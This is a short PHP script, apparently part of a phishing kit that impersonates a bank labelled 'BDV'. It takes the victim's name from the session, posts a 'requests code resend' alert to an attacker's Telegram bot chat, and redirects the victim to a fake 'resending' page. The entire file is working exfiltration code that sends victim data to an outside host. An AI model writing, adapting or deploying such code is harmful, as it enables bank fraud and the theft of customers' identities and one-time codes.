<?php
// Incluir la configuración de Telegram
include('config.php');

// Iniciar la sesión para acceder a la variable de sesión
session_start();

// Verificar si el nombre está almacenado en la sesión
$nombre = isset($_SESSION['nombre']) ? $_SESSION['nombre'] : 'Desconocido'; // Usar el nombre de la sesión

// Mensaje que será enviado a Telegram
$message = "BDV\n👤Nombre: " . $nombre . "\nSolicita reenviar codigo. 🔄🔄🔄";

// Enviar mensaje a Telegram usando file_get_contents
$telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
$response = file_get_contents($telegramApiUrl);

// Redirige después de enviar el mensaje
header('Location: reenviando.html'); // Redirige a la página que deseas después de enviar el mensaje
exit();
?>
